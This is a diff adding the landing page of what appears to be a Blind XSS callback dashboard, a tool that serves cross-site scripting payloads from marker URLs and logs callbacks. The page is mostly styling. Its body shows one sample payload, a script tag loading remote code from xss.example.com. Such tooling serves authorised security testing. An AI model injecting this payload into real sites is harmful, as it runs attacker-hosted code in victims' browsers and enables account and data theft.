@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Blind XSS HIT Dashboard</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #101214;
+      --panel: #171b1f;
+      --line: #303941;
+      --text: #edf2f7;
+      --muted: #9aa7b2;
+      --accent: #20c997;
+    }
+    * { box-sizing: border-box; }
+    body {
+      min-height: 100vh;
+      margin: 0;
+      display: grid;
+      place-items: center;
+      padding: 24px;
+      background: var(--bg);
+      color: var(--text);
+      font: 15px/1.5 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+    main {
+      width: min(760px, 100%);
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      padding: 28px;
+    }
+    h1 { margin: 0 0 10px; font-size: 28px; }
+    p { color: var(--muted); }
+    a {
+      display: inline-flex;
+      align-items: center;
+      min-height: 40px;
+      padding: 8px 12px;
+      border-radius: 6px;
+      color: #07110e;
+      background: var(--accent);
+      font-weight: 700;
+      text-decoration: none;
+    }
+    code {
+      display: block;
+      overflow-x: auto;
+      padding: 12px;
+      border-radius: 6px;
+      border: 1px solid var(--line);
+      background: #0b0d0f;
+      color: var(--text);
+      white-space: nowrap;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>Blind XSS HIT Dashboard</h1>
+    <p>Serve Blind XSS payloads from scoped marker URLs and review callbacks in a password-protected dashboard.</p>
+    <code>&lt;script src="https://xss.example.com/x/blind-xss"&gt;&lt;/script&gt;</code>
+    <p><a href="/dashboard">Open dashboard</a></p>
+  </main>
+</body>
+</html>
